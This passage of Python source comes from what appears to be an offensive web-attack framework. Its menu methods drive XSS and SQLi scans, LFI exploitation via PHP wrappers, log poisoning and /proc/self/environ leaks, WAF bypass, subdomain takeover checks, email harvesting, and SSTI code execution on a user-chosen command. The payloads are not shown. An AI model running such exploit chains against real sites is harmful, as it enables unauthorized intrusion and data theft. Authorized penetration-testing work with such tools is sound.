        with console.status("[bold red]Running comprehensive XSS scan (Crawl + WAF + Mine + Reflected + DOM + Blind)...[/bold red]"):
            result = run_xssstrike_scan(url, scan_type='full', param=param)
        self.results['findings']['xss_full_adv'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] XSS VULNERABILITY CONFIRMED![/bold red]")
            # Summarize each phase
            for phase in ['crawl', 'waf', 'reflected', 'dom', 'blind']:
                phase_data = result.get('details', {}).get(phase, {})
                if phase_data and phase_data.get('vulnerable'):
                    console.print(f"  [red]*[/red] {phase.upper()}: Vulnerable!")
        else:
            console.print("[green][+] No XSS vulnerability detected in full scan[/green]")

    def _scan_sqli_full(self):
        """SQLi Full Scan - All SQLi types (SQLMap-style)"""
        console.print(f"\n[bold red][*] SQLi FULL SCAN (SQLMap-style) on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        param = Prompt.ask("[yellow]Parameter to test[/yellow]", default="id")
        with console.status("[bold red]Running comprehensive SQLi scan (Detect + Fingerprint + WAF + Extract + DIOS)...[/bold red]"):
            result = run_sqlmap_scan(url, scan_type='full', param=param)
        self.results['findings']['sqli_full'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] SQLi VULNERABILITY CONFIRMED![/bold red]")
            # Summarize each phase
            for phase in ['detection', 'fingerprint', 'waf', 'extraction', 'dios']:
                phase_data = result.get('details', {}).get(phase, {})
                if phase_data and phase_data.get('vulnerable'):
                    console.print(f"  [red]*[/red] {phase.upper()}: Vulnerable!")
            techniques = result.get('details', {}).get('detection', {}).get('techniques_vulnerable', [])
            if techniques:
                console.print(f"  [cyan]Vulnerable techniques: {', '.join(techniques)}[/cyan]")
            db = result.get('details', {}).get('fingerprint', {}).get('details', {}).get('db_type')
            if db:
                console.print(f"  [cyan]Database: {db}[/cyan]")
        else:
            console.print("[green][+] No SQLi vulnerability detected in full scan[/green]")

    # ========================================================================
    # v5.0 FUSION BATCH 2 - ADVANCED LFI + PATH TRAVERSAL SCAN METHODS
    # ========================================================================

    def _scan_lfi_advanced_detect(self):
        """LFI Advanced Detection (Depth Traversal + Multi-Encoding + Null Byte)"""
        console.print(f"\n[bold cyan][*] LFI Advanced Detection on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing LFI with depth traversal, multi-encoding, null byte, path truncation...[/bold cyan]"):
            result = run_lfi_advanced_scan(url, scan_type="detect")
        self.results['findings']['lfi_advanced_detect'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] LFI VULNERABLE! OS: {result.get('details', {}).get('os_detected', 'Unknown')}[/bold red]")
            for f in result.get('findings', [])[:5]:
                console.print(f"  [yellow]Type: {f.get('type')}, Payload: {f.get('payload', f.get('payload_preview', ''))[:60]}[/yellow]")
        else:
            console.print("[green][+] No advanced LFI vulnerability detected[/green]")

    def _scan_lfi_php_wrappers(self):
        """LFI PHP Wrapper Exploitation (filter, input, data, expect)"""
        console.print(f"\n[bold cyan][*] LFI PHP Wrapper Exploitation on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing PHP wrappers: filter, input, data, expect, phar...[/bold cyan]"):
            result = run_lfi_advanced_scan(url, scan_type="php_wrappers")
        self.results['findings']['lfi_php_wrappers'] = result
        if result.get('vulnerable'):
            for w in result.get('details', {}).get('wrappers_working', []):
                console.print(f"  [green][+] PHP Wrapper '{w}' works![/green]")
            if result.get('details', {}).get('rce_achieved'):
                console.print(f"[bold red][!!!] RCE VIA PHP WRAPPER! Methods: {result['details']['rce_methods']}[/bold red]")
                console.print(f"  Output: {str(result['details'].get('command_output', ''))[:100]}")
        else:
            console.print("[yellow][!] No PHP wrappers exploitable[/yellow]")

    def _scan_lfi_log_poisoning(self):
        """LFI Log Poisoning RCE (Apache/Nginx/SSH + PHP Session)"""
        console.print(f"\n[bold red][*] LFI Log Poisoning RCE on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Attempting log poisoning RCE via Apache/Nginx/SSH logs + PHP sessions...[/bold red]"):
            result = run_lfi_advanced_scan(url, scan_type="log_poisoning")
        self.results['findings']['lfi_log_poisoning'] = result
        if result.get('details', {}).get('rce_achieved'):
            console.print(f"[bold red][!!!] RCE VIA LOG POISONING! Log: {result['details'].get('log_path_found')}[/bold red]")
            console.print(f"  Output: {str(result['details'].get('command_output', ''))[:100]}")
        elif result.get('details', {}).get('poisoned_logs'):
            console.print(f"[yellow][!] Log files readable but RCE not confirmed: {result['details']['poisoned_logs']}[/yellow]")
        else:
            console.print("[yellow][!] Log poisoning not successful[/yellow]")

    def _scan_lfi_proc_self(self):
        """LFI /proc/self Exploitation (environ, cmdline, fd, version)"""
        console.print(f"\n[bold cyan][*] LFI /proc/self Exploitation on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Exploiting /proc/self/environ, cmdline, fd, version...[/bold cyan]"):
            result = run_lfi_advanced_scan(url, scan_type="proc_self")
        self.results['findings']['lfi_proc_self'] = result
        if result.get('details', {}).get('environ_leaked'):
            env_count = len(result.get('details', {}).get('env_vars', []))
            console.print(f"[bold red][!!!] /proc/self/environ LEAKED! {env_count} env vars found[/bold red]")
            for k, v in result.get('details', {}).get('env_vars', [])[:5]:
                console.print(f"  [cyan]{k}={v}[/cyan]")
        if result.get('details', {}).get('rce_achieved'):
            console.print(f"[bold red][!!!] RCE via /proc/self/environ![/bold red]")
        if result.get('details', {}).get('fd_files'):
            console.print(f"  [yellow]File descriptors accessible: {len(result['details']['fd_files'])}[/yellow]")

    def _scan_lfi_waf_bypass(self):
        """LFI WAF Bypass (12 techniques + Header evasion + Method switching)"""
        console.print(f"\n[bold magenta][*] LFI WAF Bypass on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold magenta]Testing 12 WAF bypass techniques + header evasion + method switching...[/bold magenta]"):
            result = run_lfi_advanced_scan(url, scan_type="waf_bypass")
        self.results['findings']['lfi_waf_bypass'] = result
        if result.get('details', {}).get('waf_detected'):
            console.print(f"[bold yellow][!] WAF/FILTER DETECTED[/bold yellow]")
        if result.get('vulnerable'):
            for b in result.get('details', {}).get('bypasses_working', []):
                console.print(f"  [green][+] BYPASS: {b.get('technique')} (depth={b.get('depth')})[/green]")
        else:
            console.print("[yellow][!] WAF bypass not successful[/yellow]")

    def _scan_lfi_auto_exploit(self):
        """LFI Auto Exploit Chain (Detect -> Fingerprint -> Exploit -> RCE)"""
        console.print(f"\n[bold red][*] LFI AUTO EXPLOIT CHAIN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold red]Running full auto-exploit chain: Detect -> Fingerprint -> PHP Wrappers -> /proc/self -> Log Poisoning...[/bold red]"):
            result = run_lfi_advanced_scan(url, scan_type="auto_exploit")
        self.results['findings']['lfi_auto_exploit'] = result
        if result.get('details', {}).get('rce_achieved'):
            console.print(f"[bold red][!!!] AUTO EXPLOIT: RCE ACHIEVED via {result['details'].get('rce_method')}[/bold red]")
            console.print(f"  OS: {result['details'].get('os_detected', 'Unknown')}")
            console.print(f"  Output: {str(result['details'].get('command_output', ''))[:100]}")
        elif result.get('vulnerable'):
            console.print(f"[bold yellow][!] LFI confirmed but RCE not achieved[/bold yellow]")
            console.print(f"  OS: {result['details'].get('os_detected', 'Unknown')}")
        else:
            console.print("[green][+] No LFI vulnerability found after full exploit chain[/green]")

    def _scan_path_traversal_detect(self):
        """Path Traversal Detection (Multi-encoding + Linux/Windows)"""
        console.print(f"\n[bold cyan][*] Path Traversal Detection on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Testing path traversal with 16+ traversal sequences + depth fuzzing...[/bold cyan]"):
            result = run_path_traversal_scan(url, scan_type="detect")
        self.results['findings']['path_traversal_detect'] = result
        if result.get('vulnerable'):
            console.print(f"[bold red][!!!] PATH TRAVERSAL DETECTED! OS: {result.get('details', {}).get('os_detected', 'Unknown')}[/bold red]")
            for f in result.get('findings', [])[:5]:
                console.print(f"  [yellow]Type: {f.get('type')}, Seq: {f.get('traversal_sequence', 'N/A')}, "
                            f"Payload: {f.get('payload', '')[:50]}[/yellow]")
        else:
            console.print("[green][+] No path traversal vulnerability detected[/green]")

    def _scan_path_traversal_config(self):
        """Path Traversal Config File Scanner (80+ config paths + Java App Servers)"""
        console.print(f"\n[bold cyan][*] Path Traversal Config File Scanner on {self.target}[/bold cyan]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold cyan]Scanning 80+ config files including Tomcat/JBoss/WebLogic...[/bold cyan]"):
            result = run_path_traversal_scan(url, scan_type="scan_config")
        self.results['findings']['path_traversal_config'] = result
        total_found = result.get('details', {}).get('total_found', 0)
        total_tested = result.get('details', {}).get('total_tested', 0)
        categories = result.get('details', {}).get('categories_found', [])
        console.print(f"  [green]Files found: {total_found}/{total_tested}[/green]")
        if categories:
            console.print(f"  [cyan]Categories: {', '.join(categories)}[/cyan]")
        for f in result.get('details', {}).get('files_found', [])[:8]:
            console.print(f"  [yellow]{f['file']} ({f['content_length']} bytes)[/yellow]")

    def _scan_path_traversal_encoding(self):
        """Path Traversal Encoding Bypass (16 methods + Header + Method evasion)"""
        console.print(f"\n[bold magenta][*] Path Traversal Encoding Bypass on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        with console.status("[bold magenta]Testing 16 encoding bypass methods + header evasion + HTTP method switching...[/bold magenta]"):
            result = run_path_traversal_scan(url, scan_type="bypass_encoding")
        self.results['findings']['path_traversal_encoding'] = result
        if result.get('details', {}).get('baseline_blocked'):
            console.print(f"[bold yellow][!] Standard traversal BLOCKED - WAF/filter detected[/bold yellow]")
        if result.get('vulnerable'):
            for b in result.get('details', {}).get('bypasses_working', []):
                console.print(f"  [green][+] ENCODING BYPASS: {b.get('encoding')} (depth={b.get('depth')})[/green]")
        else:
            console.print("[yellow][!] No encoding bypass successful[/yellow]")

    def _scan_lfi_pathtraversal_full(self):
        """LFI/Path Traversal Full Scan (All techniques combined)"""
        console.print(f"\n[bold red][*] LFI/PATH TRAVERSAL FULL SCAN on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"

        all_results = {}

        with console.status("[bold red]Phase 1: LFI Advanced Detection...[/bold red]"):
            all_results['lfi_detect'] = run_lfi_advanced_scan(url, scan_type="detect")
        with console.status("[bold red]Phase 2: Path Traversal Detection...[/bold red]"):
            all_results['pt_detect'] = run_path_traversal_scan(url, scan_type="detect")
        with console.status("[bold red]Phase 3: PHP Wrapper Exploitation...[/bold red]"):
            all_results['php_wrappers'] = run_lfi_advanced_scan(url, scan_type="php_wrappers")
        with console.status("[bold red]Phase 4: /proc/self Exploitation...[/bold red]"):
            all_results['proc_self'] = run_lfi_advanced_scan(url, scan_type="proc_self")
        with console.status("[bold red]Phase 5: Log Poisoning RCE...[/bold red]"):
            all_results['log_poisoning'] = run_lfi_advanced_scan(url, scan_type="log_poisoning")
        with console.status("[bold red]Phase 6: Encoding Bypass...[/bold red]"):
            all_results['encoding_bypass'] = run_path_traversal_scan(url, scan_type="bypass_encoding")
        with console.status("[bold red]Phase 7: Config File Scan...[/bold red]"):
            all_results['config_scan'] = run_path_traversal_scan(url, scan_type="scan_config")

        self.results['findings']['lfi_pathtraversal_full'] = all_results

        # Summary
        vuln_count = sum(1 for r in all_results.values() if r and r.get('vulnerable'))
        rce_count = sum(1 for r in all_results.values()
                       if r and r.get('details', {}).get('rce_achieved'))
        console.print(f"\n[bold green][+] Full Scan Complete![/bold green]")
        console.print(f"  [cyan]Phases with findings: {vuln_count}/7[/cyan]")
        if rce_count:
            console.print(f"[bold red][!!!] RCE ACHIEVED in {rce_count} phase(s)![/bold red]")
        console.print(f"  [yellow]LFI Detected: {'YES' if all_results.get('lfi_detect', {}).get('vulnerable') else 'NO'}[/yellow]")
        console.print(f"  [yellow]PT Detected: {'YES' if all_results.get('pt_detect', {}).get('vulnerable') else 'NO'}[/yellow]")
        console.print(f"  [yellow]PHP Wrappers: {'YES' if all_results.get('php_wrappers', {}).get('vulnerable') else 'NO'}[/yellow]")
        console.print(f"  [yellow]Log Poisoning: {'YES' if all_results.get('log_poisoning', {}).get('vulnerable') else 'NO'}[/yellow]")
        console.print(f"  [yellow]Proc/Self: {'YES' if all_results.get('proc_self', {}).get('vulnerable') else 'NO'}[/yellow]")

    # ========================================================================
    # v5.0 FUSION Batch 3 - Advanced Subdomain Engine (Task 2c) - IDs 164-169
    # ========================================================================

    def _scan_subdomain_passive_adv(self):
        """Subdomain Passive Advanced (13+ Sources)"""
        console.print(f"\n[bold cyan][*] Advanced Passive Subdomain Enum on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Querying 13+ passive sources (crt.sh, certspotter, hackertarget, virustotal, threatcrowd, dnsdumpster, securitytrails)...[/bold cyan]"):
            result = run_subdomain_advanced(self.target, scan_type="passive")
        self.results['findings']['subdomain_passive_adv'] = result
        details = result.get('details', {})
        console.print(f"  [green]Found {details.get('total_found', 0)} subdomains from {len(details.get('sources_used', {}))} sources[/green]")

    def _scan_subdomain_bruteforce_adv(self):
        """Subdomain Brute Force Advanced (200+ wordlist)"""
        console.print(f"\n[bold cyan][*] Advanced DNS Brute Force on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Brute forcing subdomains with 200+ word list...[/bold cyan]"):
            result = run_subdomain_advanced(self.target, scan_type="bruteforce")
        self.results['findings']['subdomain_bruteforce_adv'] = result
        details = result.get('details', {})
        console.print(f"  [green]Found {details.get('total_found', 0)} subdomains via brute force[/green]")

    def _scan_subdomain_cert_adv(self):
        """Subdomain Certificate Transparency (Deep)"""
        console.print(f"\n[bold cyan][*] Certificate Transparency Deep Search on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Searching CT logs (crt.sh, certspotter, Google CT)...[/bold cyan]"):
            result = run_subdomain_advanced(self.target, scan_type="cert")
        self.results['findings']['subdomain_cert_adv'] = result
        details = result.get('details', {})
        console.print(f"  [green]Found {details.get('total_found', 0)} subdomains from CT logs[/green]")

    def _scan_subdomain_takeover_adv(self):
        """Subdomain Takeover Check (25+ Services)"""
        console.print(f"\n[bold red][*] Subdomain Takeover Check on {self.target}[/bold red]")
        with console.status("[bold red]Checking for subdomain takeover (25+ service signatures)...[/bold red]"):
            result = run_subdomain_advanced(self.target, scan_type="takeover")
        self.results['findings']['subdomain_takeover_adv'] = result
        details = result.get('details', {})
        vulns = details.get('takeover_vulnerable', [])
        if vulns:
            console.print(f"  [red][!] {len(vulns)} potential takeover vulnerabilities![/red]")
            for v in vulns:
                console.print(f"    [red]{v.get('subdomain')} -> {v.get('service')}[/red]")
        else:
            console.print(f"  [green][+] No takeover vulnerabilities detected[/green]")

    def _scan_subdomain_cloud_assets(self):
        """Cloud Asset Discovery (S3, Azure, GCP, Firebase)"""
        console.print(f"\n[bold cyan][*] Cloud Asset Discovery for {self.target}[/bold cyan]")
        with console.status("[bold cyan]Searching for exposed cloud assets (S3, Azure Blob, GCP Storage, Firebase)...[/bold cyan]"):
            result = run_subdomain_advanced(self.target, scan_type="cloud")
        self.results['findings']['subdomain_cloud_assets'] = result
        details = result.get('details', {})
        assets = details.get('cloud_assets', [])
        if assets:
            for a in assets:
                status = "PUBLIC" if a.get('public') else "EXISTS"
                console.print(f"  [yellow][{a['provider']}] {a['url']} - {status}[/yellow]")
        else:
            console.print(f"  [green][+] No exposed cloud assets found[/green]")

    def _scan_subdomain_full_recon_adv(self):
        """Full Subdomain Recon Advanced (Passive + Cert + Brute + Live + Takeover + Cloud)"""
        console.print(f"\n[bold red][*] FULL ADVANCED SUBDOMAIN RECON on {self.target}[/bold red]")
        with console.status("[bold red]Running comprehensive subdomain reconnaissance (6 phases)...[/bold red]"):
            result = run_subdomain_advanced(self.target, scan_type="full")
        self.results['findings']['subdomain_full_recon_adv'] = result
        summary = result.get('details', {}).get('summary', {})
        console.print(f"  [green]Total subdomains: {summary.get('total_subdomains', 0)}[/green]")
        console.print(f"  [green]Live subdomains: {summary.get('live_subdomains', 0)}[/green]")
        console.print(f"  [red]Takeover vuln: {summary.get('takeover_vulnerable', 0)}[/red]")
        console.print(f"  [yellow]Cloud assets: {summary.get('cloud_assets_found', 0)}[/yellow]")

    # ========================================================================
    # v5.0 FUSION Batch 3 - Advanced OSINT Engine (Task 2c) - IDs 170-173
    # ========================================================================

    def _scan_osint_email_harvest_adv(self):
        """OSINT Email Harvest Advanced (7 Sources)"""
        console.print(f"\n[bold cyan][*] Advanced Email Harvesting for {self.target}[/bold cyan]")
        with console.status("[bold cyan]Harvesting emails from 7 sources (Google, Bing, Baidu, crt.sh, HackerTarget, Hunter.io, GitHub)...[/bold cyan]"):
            result = run_osint_advanced(self.target, scan_type="emails")
        self.results['findings']['osint_email_harvest_adv'] = result
        details = result.get('details', {})
        console.print(f"  [green]Found {details.get('total_found', 0)} emails from {len(details.get('sources', {}))} sources[/green]")

    def _scan_osint_google_dorks_adv(self):
        """OSINT Google Dorks Advanced (7 Categories)"""
        console.print(f"\n[bold cyan][*] Advanced Google Dork Scanner for {self.target}[/bold cyan]")
        with console.status("[bold cyan]Running Google dork scans (7 categories: sensitive docs, login pages, errors, exposed dirs, configs, databases, backups)...[/bold cyan]"):
            result = run_osint_advanced(self.target, scan_type="dorks")
        self.results['findings']['osint_google_dorks_adv'] = result
        details = result.get('details', {})
        findings = details.get('findings', [])
        if findings:
            for f in findings[:10]:
                console.print(f"  [yellow][{f.get('category', '?')}] {f.get('results_count', 0)} results[/yellow]")
        else:
            console.print(f"  [green][+] No dork findings[/green]")

    def _scan_osint_dns_recon_adv(self):
        """OSINT DNS Recon Advanced (Full Records)"""
        console.print(f"\n[bold cyan][*] Advanced DNS Reconnaissance on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Gathering full DNS records (A, AAAA, MX, NS, TXT, SOA, CNAME)...[/bold cyan]"):
            result = run_osint_advanced(self.target, scan_type="dns")
        self.results['findings']['osint_dns_recon_adv'] = result
        details = result.get('details', {})
        records = details.get('records', {})
        if records:
            for rtype, values in records.items():
                for val in values[:3]:
                    console.print(f"  [cyan]{rtype}: {val}[/cyan]")
        console.print(f"  [green]Total records: {details.get('total_records', 0)}[/green]")

    def _scan_osint_full_adv(self):
        """Full OSINT Advanced Scan (Emails + Dorks + Breach + DNS + WHOIS + Social + Tech)"""
        console.print(f"\n[bold red][*] FULL ADVANCED OSINT SCAN on {self.target}[/bold red]")
        with console.status("[bold red]Running comprehensive OSINT reconnaissance (7 phases)...[/bold red]"):
            result = run_osint_advanced(self.target, scan_type="full")
        self.results['findings']['osint_full_adv'] = result
        summary = result.get('details', {}).get('summary', {})
        console.print(f"  [green]Emails: {summary.get('emails_found', 0)}[/green]")
        console.print(f"  [green]Hosts: {summary.get('hosts_found', 0)}[/green]")
        console.print(f"  [green]Dork findings: {summary.get('dork_findings', 0)}[/green]")
        console.print(f"  [red]Breaches: {summary.get('breaches_found', 0)}[/red]")
        console.print(f"  [cyan]Technologies: {summary.get('technologies_found', 0)}[/cyan]")

    # ========================================================================
    # v5.0 FUSION Batch 4 - Wapiti + Dirsearch Engines (Task 3a)
    # ========================================================================

    def _scan_wapiti_xss(self):
        """Wapiti XSS Module - Black-box web fuzzer XSS testing"""
        console.print(f"\n[bold red][*] WAPITI XSS MODULE on {self.target}[/bold red]")
        with console.status("[bold red]Running Wapiti XSS module (black-box fuzzer)...[/bold red]"):
            result = run_wapiti_scan(self.target, scan_type='xss')
        self.results['findings']['wapiti_xss'] = result
        vulns = result.get('findings', [])
        console.print(f"  [red]XSS vulnerabilities: {len(vulns)}[/red]")
        for v in vulns[:5]:
            console.print(f"    [yellow]{v.get('url', '')} param='{v.get('parameter', '')}' payload='{v.get('payload', '')[:40]}'[/yellow]")

    def _scan_wapiti_sqli(self):
        """Wapiti SQLi Module - Black-box web fuzzer SQLi testing"""
        console.print(f"\n[bold red][*] WAPITI SQLI MODULE on {self.target}[/bold red]")
        with console.status("[bold red]Running Wapiti SQLi module (black-box fuzzer)...[/bold red]"):
            result = run_wapiti_scan(self.target, scan_type='sqli')
        self.results['findings']['wapiti_sqli'] = result
        vulns = result.get('findings', [])
        console.print(f"  [red]SQLi vulnerabilities: {len(vulns)}[/red]")
        for v in vulns[:5]:
            console.print(f"    [yellow]{v.get('url', '')} param='{v.get('parameter', '')}' evidence='{v.get('evidence', '')[:50]}'[/yellow]")

    def _scan_wapiti_ssrf(self):
        """Wapiti SSRF Module - Black-box web fuzzer SSRF testing"""
        console.print(f"\n[bold red][*] WAPITI SSRF MODULE on {self.target}[/bold red]")
        with console.status("[bold red]Running Wapiti SSRF module (black-box fuzzer)...[/bold red]"):
            result = run_wapiti_scan(self.target, scan_type='ssrf')
        self.results['findings']['wapiti_ssrf'] = result
        vulns = result.get('findings', [])
        console.print(f"  [red]SSRF vulnerabilities: {len(vulns)}[/red]")
        for v in vulns[:5]:
            console.print(f"    [yellow]{v.get('url', '')} param='{v.get('parameter', '')}' payload='{v.get('payload', '')[:50]}'[/yellow]")

    def _scan_wapiti_full(self):
        """Wapiti Full Scan - All 7 attack modules"""
        console.print(f"\n[bold red][*] WAPITI FULL SCAN (ALL MODULES) on {self.target}[/bold red]")
        with console.status("[bold red]Running Wapiti full scan (7 modules: XSS, SQLi, SSRF, XXE, CRLF, LFI, Cmdi)...[/bold red]"):
            result = run_wapiti_scan(self.target, scan_type='full')
        self.results['findings']['wapiti_full'] = result
        details = result.get('details', {})
        modules = details.get('modules', {})
        console.print(f"  [cyan]Modules run: {len(modules)}[/cyan]")
        for mod_name, mod_result in modules.items():
            vuln_count = len(mod_result.get('vulnerable', [])) if isinstance(mod_result, dict) else 0
            console.print(f"    [green]{mod_name}: {vuln_count} findings[/green]")

    def _scan_wapiti_crlf(self):
        """Wapiti CRLF Module - Black-box web fuzzer CRLF testing"""
        console.print(f"\n[bold red][*] WAPITI CRLF MODULE on {self.target}[/bold red]")
        with console.status("[bold red]Running Wapiti CRLF module (black-box fuzzer)...[/bold red]"):
            result = run_wapiti_scan(self.target, scan_type='crlf')
        self.results['findings']['wapiti_crlf'] = result
        vulns = result.get('findings', [])
        console.print(f"  [red]CRLF vulnerabilities: {len(vulns)}[/red]")
        for v in vulns[:5]:
            console.print(f"    [yellow]{v.get('url', '')} param='{v.get('parameter', '')}' payload='{v.get('payload', '')[:50]}'[/yellow]")

    def _scan_wapiti_cmd_injection(self):
        """Wapiti Command Injection Module - Black-box web fuzzer"""
        console.print(f"\n[bold red][*] WAPITI CMD INJECTION MODULE on {self.target}[/bold red]")
        with console.status("[bold red]Running Wapiti Command Injection module (black-box fuzzer)...[/bold red]"):
            result = run_wapiti_scan(self.target, scan_type='cmd_injection')
        self.results['findings']['wapiti_cmd_injection'] = result
        vulns = result.get('findings', [])
        console.print(f"  [red]Command Injection vulnerabilities: {len(vulns)}[/red]")
        for v in vulns[:5]:
            console.print(f"    [yellow]{v.get('url', '')} param='{v.get('parameter', '')}' payload='{v.get('payload', '')[:40]}'[/yellow]")

    def _scan_dirsearch_quick(self):
        """Directory Brute Force Quick - Dirsearch-style"""
        console.print(f"\n[bold cyan][*] DIRECTORY BRUTE FORCE (Quick) on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Running Dirsearch-style quick directory scan...[/bold cyan]"):
            result = run_dirsearch_scan(self.target, scan_type='quick')
        self.results['findings']['dirsearch_quick'] = result
        findings = result.get('findings', [])
        console.print(f"  [green]Paths found: {len(findings)}[/green]")
        for f in findings[:10]:
            status = f.get('status_code', 'N/A')
            path = f.get('path', '')
            console.print(f"    [cyan][{status}] {path}[/cyan]")

    def _scan_dirsearch_recursive(self):
        """Directory Brute Force Recursive - Dirsearch-style"""
        console.print(f"\n[bold cyan][*] DIRECTORY BRUTE FORCE (Recursive) on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Running Dirsearch-style recursive directory scan...[/bold cyan]"):
            result = run_dirsearch_scan(self.target, scan_type='recursive')
        self.results['findings']['dirsearch_recursive'] = result
        findings = result.get('findings', [])
        details = result.get('details', {})
        dirs = details.get('directories_discovered', [])
        console.print(f"  [green]Paths found: {len(findings)}[/green]")
        console.print(f"  [cyan]Directories discovered: {len(dirs)}[/cyan]")

    def _scan_dirsearch_extension(self):
        """Directory Extension Scan - Dirsearch-style"""
        console.print(f"\n[bold cyan][*] DIRECTORY EXTENSION SCAN on {self.target}[/bold cyan]")
        with console.status("[bold cyan]Running Dirsearch-style extension-based scan...[/bold cyan]"):
            result = run_dirsearch_scan(self.target, scan_type='extension')
        self.results['findings']['dirsearch_extension'] = result
        findings = result.get('findings', [])
        details = result.get('details', {})
        by_ext = details.get('results_by_extension', {})
        console.print(f"  [green]Total paths found: {len(findings)}[/green]")
        for ext, count in by_ext.items():
            console.print(f"    [cyan]{ext}: {count} findings[/cyan]")

    def _scan_dirsearch_deep(self):
        """Directory Deep Scan - Dirsearch-style"""
        console.print(f"\n[bold red][*] DIRECTORY DEEP SCAN on {self.target}[/bold red]")
        with console.status("[bold red]Running Dirsearch-style deep directory scan (quick + extension + recursive)...[/bold red]"):
            result = run_dirsearch_scan(self.target, scan_type='deep')
        self.results['findings']['dirsearch_deep'] = result
        findings = result.get('findings', [])
        details = result.get('details', {})
        console.print(f"  [green]Total unique paths found: {len(findings)}[/green]")
        console.print(f"  [cyan]Quick scan: {details.get('quick_results', 0)}[/cyan]")
        console.print(f"  [cyan]Extension scan: {details.get('extension_results', 0)}[/cyan]")
        console.print(f"  [cyan]Recursive scan: {details.get('recursive_results', 0)}[/cyan]")

    # ========================================================================
    # v5.0 FUSION Batch 4 - TPLmap + Nuclei-Style Engines (Task 3b)
    # ========================================================================

    def _scan_tplmap_ssti_detect(self):
        """SSTI Advanced Detection (TPLmap) - Alternative SSTI detection engine"""
        console.print(f"\n[bold magenta][*] SSTI ADVANCED DETECTION (TPLmap) on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        param = Prompt.ask("[yellow]Parameter to test (blank for auto)[/yellow]", default="")
        param = param.strip() if param.strip() else None
        with console.status("[bold magenta]Testing SSTI with TPLmap payloads (11 engines, alternative techniques)...[/bold magenta]"):
            result = run_tplmap_scan(url, scan_type='detect', param=param)
        self.results['findings']['tplmap_ssti_detect'] = result
        if result.get('vulnerable'):
            engine = result.get('details', {}).get('engine', 'Unknown')
            method = result.get('details', {}).get('detection_method', 'Unknown')
            console.print(f"[bold red][!!!] SSTI DETECTED! Engine: {engine}, Method: {method}[/bold red]")
            for f in result.get('findings', [])[:5]:
                console.print(f"  [yellow]Param: {f.get('param', '')}, Payload: {f.get('payload', '')[:80]}[/yellow]")
        else:
            console.print("[green][+] No SSTI vulnerability detected with TPLmap[/green]")

    def _scan_tplmap_ssti_identify(self):
        """SSTI Engine Identification (TPLmap) - Identify template engine with scoring"""
        console.print(f"\n[bold magenta][*] SSTI ENGINE IDENTIFICATION (TPLmap) on {self.target}[/bold magenta]")
        url = f"{self.protocol}{self.target}"
        param = Prompt.ask("[yellow]Parameter to test (blank for auto)[/yellow]", default="")
        param = param.strip() if param.strip() else None
        with console.status("[bold magenta]Identifying template engine with scoring system...[/bold magenta]"):
            result = run_tplmap_scan(url, scan_type='identify', param=param)
        self.results['findings']['tplmap_ssti_identify'] = result
        if result.get('vulnerable'):
            engine = result.get('details', {}).get('engine', 'Unknown')
            confidence = result.get('details', {}).get('confidence', 'Unknown')
            scores = result.get('details', {}).get('engine_scores', {})
            console.print(f"[bold green][+] Engine identified: {engine} (confidence: {confidence})[/bold green]")
            for eng, data in scores.items():
                console.print(f"  [cyan]{eng}: score={data.get('score', 0)}[/cyan]")
        else:
            console.print("[yellow][!] Could not identify template engine[/yellow]")

    def _scan_tplmap_sandbox_escape(self):
        """SSTI Sandbox Escape (TPLmap) - Escape template sandbox"""
        console.print(f"\n[bold red][*] SSTI SANDBOX ESCAPE (TPLmap) on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        param = Prompt.ask("[yellow]Parameter to test[/yellow]", default="name")
        engine = Prompt.ask("[yellow]Template engine (blank for auto-detect)[/yellow]", default="")
        engine = engine.strip() if engine.strip() else None
        with console.status("[bold red]Attempting sandbox escape with multiple techniques...[/bold red]"):
            result = run_tplmap_scan(url, scan_type='sandbox_escape', param=param, engine=engine)
        self.results['findings']['tplmap_sandbox_escape'] = result
        if result.get('vulnerable'):
            console.print("[bold green][+] SANDBOX ESCAPED![/bold green]")
            for f in result.get('findings', []):
                console.print(f"  [red]Payload: {f.get('payload', '')[:80]}[/red]")
        else:
            console.print("[yellow][!] Sandbox escape not confirmed (blind RCE may still work)[/yellow]")

    def _scan_tplmap_exec_code(self):
        """SSTI Code Execution (TPLmap) - Execute code via SSTI"""
        console.print(f"\n[bold red][!!!] SSTI CODE EXECUTION (TPLmap) on {self.target}[/bold red]")
        url = f"{self.protocol}{self.target}"
        param = Prompt.ask("[yellow]Parameter to exploit[/yellow]", default="name")
        engine = Prompt.ask("[yellow]Template engine (blank for auto)[/yellow]", default="")
        cmd = Prompt.ask("[yellow]Command to execute[/yellow]", default="id")
        engine = engine.strip() if engine.strip() else None
        with console.status("[bold red]Executing code via SSTI...[/bold magenta]"):
            result = run_tplmap_scan(url, scan_type='exec_code', param=param, engine=engine, code=cmd)
        self.results['findings']['tplmap_exec_code'] = result
        if result.get('vulnerable'):
            output = result.get('details', {}).get('output', 'No visible output')
            console.print(f"[bold green][+] Code execution result:[/bold green] {output[:300]}")
        else:
            console.print("[yellow][!] Code execution not confirmed[/yellow]")

    def _scan_tplmap_blind_detect(self):
        """SSTI Blind Detection (TPLmap) - Time-based and boolean-based blind SSTI"""
